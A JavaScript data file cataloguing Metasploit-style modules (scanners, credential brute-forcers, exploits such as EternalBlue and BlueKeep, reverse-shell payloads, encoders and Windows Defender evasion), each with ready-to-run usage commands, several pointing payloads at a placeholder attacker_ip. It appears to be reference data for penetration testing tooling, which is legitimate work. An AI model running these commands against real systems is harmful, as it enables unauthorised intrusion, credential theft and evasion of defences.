const MODULES_DB = [
    {
        "name": "TCP Port Scanner",
        "path": "auxiliary/scanner/portscan/tcp",
        "category": "Port Scanning",
        "description": "Basic TCP port scanner to identify open ports",
        "targets": [
            "Any",
            "Network"
        ],
        "tags": [
            "tcp",
            "port",
            "scan",
            "network",
            "reconnaissance"
        ],
        "usage": "use auxiliary/scanner/portscan/tcp\nset RHOSTS target_ip\nset PORTS 1-1000\nrun",
        "options": [
            "RHOSTS",
            "PORTS",
            "THREADS",
            "TIMEOUT"
        ]
    },
    {
        "name": "SYN Port Scanner",
        "path": "auxiliary/scanner/portscan/syn",
        "category": "Port Scanning",
        "description": "Fast SYN port scanner for stealth scanning",
        "targets": [
            "Any",
            "Network"
        ],
        "tags": [
            "syn",
            "port",
            "scan",
            "stealth",
            "fast"
        ],
        "usage": "use auxiliary/scanner/portscan/syn\nset RHOSTS target_ip\nset PORTS 1-65535\nrun",
        "options": [
            "RHOSTS",
            "PORTS",
            "INTERFACE",
            "SNAPLEN"
        ]
    },
    {
        "name": "ACK Port Scanner",
        "path": "auxiliary/scanner/portscan/ack",
        "category": "Port Scanning",
        "description": "ACK port scanner to identify filtered ports and firewall rules",
        "targets": [
            "Any",
            "Network"
        ],
        "tags": [
            "ack",
            "port",
            "scan",
            "firewall",
            "filtered"
        ],
        "usage": "use auxiliary/scanner/portscan/ack\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "PORTS",
            "INTERFACE"
        ]
    },
    {
        "name": "UDP Port Scanner",
        "path": "auxiliary/scanner/discovery/udp_sweep",
        "category": "Port Scanning",
        "description": "UDP port scanner for discovering UDP services",
        "targets": [
            "Any",
            "Network"
        ],
        "tags": [
            "udp",
            "port",
            "scan",
            "discovery"
        ],
        "usage": "use auxiliary/scanner/discovery/udp_sweep\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "PORTS",
            "THREADS"
        ]
    },
    {
        "name": "SCTP Port Scanner",
        "path": "auxiliary/scanner/sctp/sctp_enum",
        "category": "Port Scanning",
        "description": "SCTP port scanner for telecom systems",
        "targets": [
            "Network",
            "Telecom"
        ],
        "tags": [
            "sctp",
            "port",
            "scan",
            "telecom"
        ],
        "usage": "use auxiliary/scanner/sctp/sctp_enum\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "THREADS"
        ]
    },
    {
        "name": "HTTP Version Scanner",
        "path": "auxiliary/scanner/http/http_version",
        "category": "Web Scanning",
        "description": "Scan for HTTP server version information",
        "targets": [
            "Web",
            "HTTP"
        ],
        "tags": [
            "http",
            "version",
            "web",
            "fingerprint"
        ],
        "usage": "use auxiliary/scanner/http/http_version\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "VHOST",
            "SSL"
        ]
    },
    {
        "name": "Directory Scanner",
        "path": "auxiliary/scanner/http/dir_scanner",
        "category": "Web Scanning",
        "description": "Scan for common directories on web servers",
        "targets": [
            "Web",
            "HTTP"
        ],
        "tags": [
            "directory",
            "web",
            "enumeration",
            "brute-force"
        ],
        "usage": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "PATH",
            "DICTIONARY"
        ]
    },
    {
        "name": "WordPress Scanner",
        "path": "auxiliary/scanner/http/wordpress_scanner",
        "category": "Web Scanning",
        "description": "WordPress vulnerability scanner",
        "targets": [
            "Web",
            "WordPress"
        ],
        "tags": [
            "wordpress",
            "cms",
            "vulnerability",
            "web"
        ],
        "usage": "use auxiliary/scanner/http/wordpress_scanner\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI",
            "ENUMERATE"
        ]
    },
    {
        "name": "Joomla Scanner",
        "path": "auxiliary/scanner/http/joomla_version",
        "category": "Web Scanning",
        "description": "Joomla CMS version scanner",
        "targets": [
            "Web",
            "Joomla"
        ],
        "tags": [
            "joomla",
            "cms",
            "version",
            "web"
        ],
        "usage": "use auxiliary/scanner/http/joomla_version\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI"
        ]
    },
    {
        "name": "Drupal Scanner",
        "path": "auxiliary/scanner/http/drupal_views_user_enum",
        "category": "Web Scanning",
        "description": "Drupal user enumeration scanner",
        "targets": [
            "Web",
            "Drupal"
        ],
        "tags": [
            "drupal",
            "cms",
            "enumeration",
            "users"
        ],
        "usage": "use auxiliary/scanner/http/drupal_views_user_enum\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI"
        ]
    },
    {
        "name": "SQL Injection Scanner",
        "path": "auxiliary/scanner/http/sql_injection",
        "category": "Web Scanning",
        "description": "Basic SQL injection vulnerability scanner",
        "targets": [
            "Web",
            "Database"
        ],
        "tags": [
            "sql",
            "injection",
            "vulnerability",
            "web"
        ],
        "usage": "use auxiliary/scanner/http/sql_injection\nset RHOSTS target_ip\nset TARGETURI /vulnerable.php\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI",
            "METHOD"
        ]
    },
    {
        "name": "Apache Tomcat Scanner",
        "path": "auxiliary/scanner/http/tomcat_mgr_login",
        "category": "Web Scanning",
        "description": "Apache Tomcat manager login scanner",
        "targets": [
            "Web",
            "Tomcat"
        ],
        "tags": [
            "tomcat",
            "manager",
            "login",
            "brute-force"
        ],
        "usage": "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD"
        ]
    },
    {
        "name": "MySQL Version Scanner",
        "path": "auxiliary/scanner/mysql/mysql_version",
        "category": "Database Scanning",
        "description": "Scan for MySQL version information",
        "targets": [
            "Database",
            "MySQL"
        ],
        "tags": [
            "mysql",
            "database",
            "version",
            "fingerprint"
        ],
        "usage": "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT"
        ]
    },
    {
        "name": "MySQL Login Scanner",
        "path": "auxiliary/scanner/mysql/mysql_login",
        "category": "Database Scanning",
        "description": "Brute force MySQL login credentials",
        "targets": [
            "Database",
            "MySQL"
        ],
        "tags": [
            "mysql",
            "database",
            "login",
            "brute-force"
        ],
        "usage": "use auxiliary/scanner/mysql/mysql_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD",
            "PASS_FILE"
        ]
    },
    {
        "name": "MSSQL Login Scanner",
        "path": "auxiliary/scanner/mssql/mssql_login",
        "category": "Database Scanning",
        "description": "Brute force MSSQL login credentials",
        "targets": [
            "Database",
            "Windows",
            "MSSQL"
        ],
        "tags": [
            "mssql",
            "database",
            "login",
            "brute-force",
            "windows"
        ],
        "usage": "use auxiliary/scanner/mssql/mssql_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD",
            "DOMAIN"
        ]
    },
    {
        "name": "PostgreSQL Login Scanner",
        "path": "auxiliary/scanner/postgres/postgres_login",
        "category": "Database Scanning",
        "description": "Brute force PostgreSQL login credentials",
        "targets": [
            "Database",
            "PostgreSQL",
            "Linux"
        ],
        "tags": [
            "postgresql",
            "postgres",
            "database",
            "login",
            "brute-force"
        ],
        "usage": "use auxiliary/scanner/postgres/postgres_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD",
            "DATABASE"
        ]
    },
    {
        "name": "Oracle Login Scanner",
        "path": "auxiliary/scanner/oracle/oracle_login",
        "category": "Database Scanning",
        "description": "Brute force Oracle database login credentials",
        "targets": [
            "Database",
            "Oracle"
        ],
        "tags": [
            "oracle",
            "database",
            "login",
            "brute-force"
        ],
        "usage": "use auxiliary/scanner/oracle/oracle_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD",
            "SID"
        ]
    },
    {
        "name": "MongoDB Scanner",
        "path": "auxiliary/scanner/mongodb/mongodb_login",
        "category": "Database Scanning",
        "description": "MongoDB authentication scanner",
        "targets": [
            "Database",
            "MongoDB",
            "NoSQL"
        ],
        "tags": [
            "mongodb",
            "nosql",
            "database",
            "login"
        ],
        "usage": "use auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD"
        ]
    },
    {
        "name": "SMB Version Scanner",
        "path": "auxiliary/scanner/smb/smb_version",
        "category": "Service Scanning",
        "description": "Scan for SMB version information",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "smb",
            "windows",
            "version",
            "netbios"
        ],
        "usage": "use auxiliary/scanner/smb/smb_version\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "SMBUser",
            "SMBPass",
            "SMBDomain"
        ]
    },
    {
        "name": "SMB Share Scanner",
        "path": "auxiliary/scanner/smb/smb_enumshares",
        "category": "Service Scanning",
        "description": "Enumerate SMB shares on target systems",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "smb",
            "shares",
            "enumeration",
            "windows"
        ],
        "usage": "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "SMBUser",
            "SMBPass",
            "SMBDomain",
            "ShowFiles"
        ]
    },
    {
        "name": "SMB User Enumeration",
        "path": "auxiliary/scanner/smb/smb_enumusers",
        "category": "Service Scanning",
        "description": "Enumerate users via SMB RID cycling",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "smb",
            "users",
            "enumeration",
            "rid"
        ],
        "usage": "use auxiliary/scanner/smb/smb_enumusers\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "SMBUser",
            "SMBPass",
            "SMBDomain"
        ]
    },
    {
        "name": "SMB Login Scanner",
        "path": "auxiliary/scanner/smb/smb_login",
        "category": "Brute Force",
        "description": "SMB login brute force scanner",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "smb",
            "login",
            "brute-force",
            "windows"
        ],
        "usage": "use auxiliary/scanner/smb/smb_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "SMBUser",
            "SMBPass",
            "SMBDomain",
            "PASS_FILE"
        ]
    },
    {
        "name": "SSH Version Scanner",
        "path": "auxiliary/scanner/ssh/ssh_version",
        "category": "Service Scanning",
        "description": "Scan for SSH version information",
        "targets": [
            "Linux",
            "Unix",
            "SSH"
        ],
        "tags": [
            "ssh",
            "version",
            "fingerprint",
            "linux"
        ],
        "usage": "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TIMEOUT"
        ]
    },
    {
        "name": "SSH Login Scanner",
        "path": "auxiliary/scanner/ssh/ssh_login",
        "category": "Brute Force",
        "description": "Brute force SSH login credentials",
        "targets": [
            "Linux",
            "Unix",
            "SSH"
        ],
        "tags": [
            "ssh",
            "login",
            "brute-force",
            "credentials"
        ],
        "usage": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD",
            "PASS_FILE",
            "USER_FILE"
        ]
    },
    {
        "name": "SSH Key Scanner",
        "path": "auxiliary/scanner/ssh/ssh_login_pubkey",
        "category": "Service Scanning",
        "description": "SSH public key authentication scanner",
        "targets": [
            "Linux",
            "Unix",
            "SSH"
        ],
        "tags": [
            "ssh",
            "keys",
            "authentication",
            "pubkey"
        ],
        "usage": "use auxiliary/scanner/ssh/ssh_login_pubkey\nset RHOSTS target_ip\nset KEY_PATH /path/to/key\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "KEY_PATH"
        ]
    },
    {
        "name": "FTP Version Scanner",
        "path": "auxiliary/scanner/ftp/ftp_version",
        "category": "Service Scanning",
        "description": "Scan for FTP server version information",
        "targets": [
            "FTP",
            "Any"
        ],
        "tags": [
            "ftp",
            "version",
            "fingerprint"
        ],
        "usage": "use auxiliary/scanner/ftp/ftp_version\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT"
        ]
    },
    {
        "name": "Anonymous FTP Scanner",
        "path": "auxiliary/scanner/ftp/anonymous",
        "category": "Service Scanning",
        "description": "Check for anonymous FTP access",
        "targets": [
            "FTP",
            "Any"
        ],
        "tags": [
            "ftp",
            "anonymous",
            "access"
        ],
        "usage": "use auxiliary/scanner/ftp/anonymous\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "FTPUSER",
            "FTPPASS"
        ]
    },
    {
        "name": "FTP Login Scanner",
        "path": "auxiliary/scanner/ftp/ftp_login",
        "category": "Brute Force",
        "description": "Brute force FTP login credentials",
        "targets": [
            "FTP",
            "Any"
        ],
        "tags": [
            "ftp",
            "login",
            "brute-force"
        ],
        "usage": "use auxiliary/scanner/ftp/ftp_login\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "USERNAME",
            "PASSWORD",
            "PASS_FILE"
        ]
    },
    {
        "name": "MS17-010 EternalBlue Scanner",
        "path": "auxiliary/scanner/smb/smb_ms17_010",
        "category": "Vulnerability Scanning",
        "description": "Scan for MS17-010 EternalBlue vulnerability",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "ms17-010",
            "eternalblue",
            "smb",
            "vulnerability"
        ],
        "usage": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "CHECK_ARCH",
            "CHECK_DOPU",
            "CHECK_PIPE"
        ]
    },
    {
        "name": "OpenSSL Heartbleed Scanner",
        "path": "auxiliary/scanner/ssl/openssl_heartbleed",
        "category": "Vulnerability Scanning",
        "description": "Scan for OpenSSL Heartbleed vulnerability (CVE-2014-0160)",
        "targets": [
            "SSL",
            "TLS",
            "Any"
        ],
        "tags": [
            "heartbleed",
            "ssl",
            "tls",
            "cve-2014-0160"
        ],
        "usage": "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TLS_CALLBACK",
            "TLS_VERSION"
        ]
    },
    {
        "name": "Shellshock Scanner",
        "path": "auxiliary/scanner/http/apache_mod_cgi_bash_env",
        "category": "Vulnerability Scanning",
        "description": "Scan for Shellshock vulnerability (CVE-2014-6271)",
        "targets": [
            "Web",
            "Linux",
            "Unix"
        ],
        "tags": [
            "shellshock",
            "bash",
            "cgi",
            "cve-2014-6271"
        ],
        "usage": "use auxiliary/scanner/http/apache_mod_cgi_bash_env\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI",
            "CMD"
        ]
    },
    {
        "name": "Log4Shell Scanner",
        "path": "auxiliary/scanner/http/log4shell_scanner",
        "category": "Vulnerability Scanning",
        "description": "Scan for Log4Shell vulnerability (CVE-2021-44228)",
        "targets": [
            "Web",
            "Java"
        ],
        "tags": [
            "log4j",
            "log4shell",
            "java",
            "cve-2021-44228"
        ],
        "usage": "use auxiliary/scanner/http/log4shell_scanner\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI",
            "LDAP_URL"
        ]
    },
    {
        "name": "BlueKeep Scanner",
        "path": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
        "category": "Vulnerability Scanning",
        "description": "Scan for BlueKeep RDP vulnerability (CVE-2019-0708)",
        "targets": [
            "Windows",
            "RDP"
        ],
        "tags": [
            "bluekeep",
            "rdp",
            "cve-2019-0708",
            "windows"
        ],
        "usage": "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\nset RHOSTS target_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT"
        ]
    },
    {
        "name": "EternalBlue Exploit",
        "path": "exploit/windows/smb/ms17_010_eternalblue",
        "category": "Windows Exploits",
        "description": "Exploit MS17-010 EternalBlue vulnerability for remote code execution",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "ms17-010",
            "eternalblue",
            "rce",
            "smb"
        ],
        "usage": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "GroomAllocations",
            "GroomDelta"
        ]
    },
    {
        "name": "MS08-067 NetAPI Exploit",
        "path": "exploit/windows/smb/ms08_067_netapi",
        "category": "Windows Exploits",
        "description": "MS08-067 Microsoft Server Service Relative Path Stack Corruption",
        "targets": [
            "Windows",
            "SMB"
        ],
        "tags": [
            "ms08-067",
            "netapi",
            "smb",
            "rce"
        ],
        "usage": "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS target_ip\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "SMBPIPE"
        ]
    },
    {
        "name": "Windows RDP BlueKeep Exploit",
        "path": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "category": "Windows Exploits",
        "description": "BlueKeep RDP Remote Code Execution",
        "targets": [
            "Windows",
            "RDP"
        ],
        "tags": [
            "bluekeep",
            "rdp",
            "cve-2019-0708",
            "rce"
        ],
        "usage": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGET"
        ]
    },
    {
        "name": "Shellshock CGI Exploit",
        "path": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "category": "Linux Exploits",
        "description": "Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)",
        "targets": [
            "Linux",
            "Unix",
            "Web"
        ],
        "tags": [
            "shellshock",
            "bash",
            "cgi",
            "rce"
        ],
        "usage": "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target_ip\nset TARGETURI /cgi-bin/vulnerable.cgi\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI",
            "METHOD"
        ]
    },
    {
        "name": "Dirty COW Exploit",
        "path": "exploit/linux/local/dirtycow",
        "category": "Linux Exploits",
        "description": "Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' Race Condition Privilege Escalation",
        "targets": [
            "Linux"
        ],
        "tags": [
            "dirtycow",
            "privilege-escalation",
            "kernel",
            "race-condition"
        ],
        "usage": "use exploit/linux/local/dirtycow\nset SESSION session_id\nrun",
        "options": [
            "SESSION",
            "COMPILE"
        ]
    },
    {
        "name": "Struts2 DevMode OGNL Execution",
        "path": "exploit/multi/http/struts2_devmode",
        "category": "Web Exploits",
        "description": "Apache Struts 2 Developer Mode OGNL Execution",
        "targets": [
            "Web",
            "Java"
        ],
        "tags": [
            "struts2",
            "ognl",
            "java",
            "rce"
        ],
        "usage": "use exploit/multi/http/struts2_devmode\nset RHOSTS target_ip\nset TARGETURI /struts2-showcase/\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI"
        ]
    },
    {
        "name": "Jenkins Script Console",
        "path": "exploit/multi/http/jenkins_script_console",
        "category": "Web Exploits",
        "description": "Jenkins Script Console Command Execution",
        "targets": [
            "Web",
            "Jenkins"
        ],
        "tags": [
            "jenkins",
            "script-console",
            "rce"
        ],
        "usage": "use exploit/multi/http/jenkins_script_console\nset RHOSTS target_ip\nset TARGETURI /jenkins/\nrun",
        "options": [
            "RHOSTS",
            "RPORT",
            "TARGETURI",
            "USERNAME",
            "PASSWORD"
        ]
    },
    {
        "name": "Windows Meterpreter Reverse TCP",
        "path": "payload/windows/meterpreter/reverse_tcp",
        "category": "Windows Payloads",
        "description": "Windows Meterpreter (Reflective Injection), Reverse TCP Stager",
        "targets": [
            "Windows"
        ],
        "tags": [
            "meterpreter",
            "reverse",
            "tcp",
            "windows"
        ],
        "usage": "set payload windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT",
            "EXITFUNC"
        ]
    },
    {
        "name": "Windows x64 Meterpreter Reverse TCP",
        "path": "payload/windows/x64/meterpreter/reverse_tcp",
        "category": "Windows Payloads",
        "description": "Windows x64 Meterpreter (Reflective Injection), Reverse TCP Stager",
        "targets": [
            "Windows"
        ],
        "tags": [
            "meterpreter",
            "reverse",
            "tcp",
            "windows",
            "x64"
        ],
        "usage": "set payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT",
            "EXITFUNC"
        ]
    },
    {
        "name": "Windows Shell Reverse TCP",
        "path": "payload/windows/shell/reverse_tcp",
        "category": "Windows Payloads",
        "description": "Windows Command Shell, Reverse TCP Stager",
        "targets": [
            "Windows"
        ],
        "tags": [
            "shell",
            "reverse",
            "tcp",
            "windows"
        ],
        "usage": "set payload windows/shell/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT"
        ]
    },
    {
        "name": "Linux x86 Meterpreter Reverse TCP",
        "path": "payload/linux/x86/meterpreter/reverse_tcp",
        "category": "Linux Payloads",
        "description": "Linux Mettle x86, Reverse TCP Stager",
        "targets": [
            "Linux"
        ],
        "tags": [
            "meterpreter",
            "reverse",
            "tcp",
            "linux",
            "x86"
        ],
        "usage": "set payload linux/x86/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT"
        ]
    },
    {
        "name": "Linux x64 Meterpreter Reverse TCP",
        "path": "payload/linux/x64/meterpreter/reverse_tcp",
        "category": "Linux Payloads",
        "description": "Linux Mettle x64, Reverse TCP Stager",
        "targets": [
            "Linux"
        ],
        "tags": [
            "meterpreter",
            "reverse",
            "tcp",
            "linux",
            "x64"
        ],
        "usage": "set payload linux/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT"
        ]
    },
    {
        "name": "Linux Shell Reverse TCP",
        "path": "payload/linux/x86/shell/reverse_tcp",
        "category": "Linux Payloads",
        "description": "Linux Command Shell, Reverse TCP Stager",
        "targets": [
            "Linux"
        ],
        "tags": [
            "shell",
            "reverse",
            "tcp",
            "linux"
        ],
        "usage": "set payload linux/x86/shell/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT"
        ]
    },
    {
        "name": "PHP Meterpreter Reverse TCP",
        "path": "payload/php/meterpreter/reverse_tcp",
        "category": "Web Payloads",
        "description": "PHP Meterpreter, Reverse TCP Stager",
        "targets": [
            "PHP",
            "Web"
        ],
        "tags": [
            "php",
            "meterpreter",
            "reverse",
            "tcp",
            "web"
        ],
        "usage": "set payload php/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT"
        ]
    },
    {
        "name": "JSP Shell Reverse TCP",
        "path": "payload/java/jsp_shell_reverse_tcp",
        "category": "Web Payloads",
        "description": "Java JSP Command Shell, Reverse TCP Inline",
        "targets": [
            "Java",
            "Web"
        ],
        "tags": [
            "jsp",
            "java",
            "shell",
            "reverse",
            "tcp"
        ],
        "usage": "set payload java/jsp_shell_reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": [
            "LHOST",
            "LPORT"
        ]
    },
    {
        "name": "x86 Shikata Ga Nai",
        "path": "encoder/x86/shikata_ga_nai",
        "category": "Encoders",
        "description": "Polymorphic XOR Additive Feedback Encoder",
        "targets": [
            "x86",
            "Windows",
            "Linux"
        ],
        "tags": [
            "encoder",
            "polymorphic",
            "xor",
            "x86"
        ],
        "usage": "set encoder x86/shikata_ga_nai\ngenerate",
        "options": [
            "BufferRegister",
            "ClearDirection",
            "PrependEncoder"
        ]
    },
    {
        "name": "x64 XOR Dynamic",
        "path": "encoder/x64/xor_dynamic",
        "category": "Encoders",
        "description": "Dynamic key XOR Encoder",
        "targets": [
            "x64",
            "Windows",
            "Linux"
        ],
        "tags": [
            "encoder",
            "xor",
            "dynamic",
            "x64"
        ],
        "usage": "set encoder x64/xor_dynamic\ngenerate",
        "options": [
            "BufferRegister"
        ]
    },
    {
        "name": "Generic Base64 Encoder",
        "path": "encoder/generic/base64",
        "category": "Encoders",
        "description": "Base64 Encoder",
        "targets": [
            "Any"
        ],
        "tags": [
            "encoder",
            "base64",
            "generic"
        ],
        "usage": "set encoder generic/base64\ngenerate",
        "options": []
    },
    {
        "name": "Windows Defender Evasion",
        "path": "evasion/windows/windows_defender_exe",
        "category": "Evasion",
        "description": "Microsoft Windows Defender Evasive Executable",
        "targets": [
            "Windows"
        ],
        "tags": [
            "evasion",
            "windows-defender",
            "antivirus",
            "exe"
        ],
        "usage": "use evasion/windows/windows_defender_exe\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": [
            "FILENAME",
            "TEMPLATE"
        ]
    },
    {
        "name": "Applocker Evasion",
        "path": "evasion/windows/applocker_evasion_install_util",
        "category": "Evasion",
        "description": "AppLocker Evasion - InstallUtil",
        "targets": [
            "Windows"
        ],
        "tags": [
            "evasion",
            "applocker",
            "installutil",
            "bypass"
        ],
        "usage": "use evasion/windows/applocker_evasion_install_util\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": [
            "FILENAME"
        ]
    },
    {
        "name": "PowerShell Evasion",
        "path": "evasion/windows/windows_defender_powershell",
        "category": "Evasion",
        "description": "Microsoft Windows Defender Evasive PowerShell",
        "targets": [
            "Windows"
        ],
        "tags": [
            "evasion",
            "powershell",
            "windows-defender"
        ],
        "usage": "use evasion/windows/windows_defender_powershell\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": [
            "FILENAME"
        ]
    }
];